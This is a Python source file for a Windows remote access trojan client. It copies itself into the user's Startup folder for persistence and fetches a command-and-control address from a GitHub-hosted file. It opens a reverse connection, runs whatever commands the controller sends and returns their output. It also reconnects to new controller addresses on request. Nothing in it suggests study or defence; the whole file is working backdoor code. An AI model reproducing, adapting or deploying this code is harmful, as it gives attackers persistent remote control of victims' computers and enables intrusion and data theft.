import subprocess
import time
import socket
import requests
import os
import shutil
import getpass

user_name = getpass.getuser()

filename = "application.exe"
file_path = os.getcwd() + "\\" + filename

startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\application.exe' % user_name

if(not os.path.isfile(startup_path)):
    shutil.copy2(file_path, startup_path)



def get_ip_and_port():
    link = "https://raw.githubusercontent.com/ItsSuhail/ProjectGNIYPS/main/address.md"
    information = requests.get(link).text.strip()
    ip = information.split("<|>")[0]
    port = int(information.split("<|>")[1])

    return (ip, port)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# ip = input("IP: ")
# port = int(input("PORT: "))

try:
    client_socket.connect(("127.0.0.1", 5050))
    # client_socket.connect((ip, port))
except socket.error as error:
    while(True):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect(get_ip_and_port())
            break
        except socket.error:
            time.sleep(4)


while True:
    try:
        request = client_socket.recv(1024).decode()
        if(request == "exit()"):
            client_socket.close()
            break

        if("client_suriv.change_ip" in request):
            print("request to change ip")
            new_ip = request.split("<||>")[1]
            new_port = request.split("<||>")[2]
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                print("connecting to new ip address")
                client_socket.connect((new_ip, int(new_port)))
            except:
                print("couldnt connect, getting ip and port from link")
                while True:
                    try:
                        print("trying")
                        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        client_socket.connect(get_ip_and_port())
                        break
                    except socket.error:
                        print("failed, sleeping")
                        time.sleep(4)


        else:
            output = subprocess.getoutput(request)
            client_socket.send(output.encode())

    except socket.error:
        print("socket error")
        while True:
            try:
                print("trying to get ip and port: ", get_ip_and_port())
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect(get_ip_and_port())
                break
            except socket.error as error:
                print("sleeping:", error)
                time.sleep(10)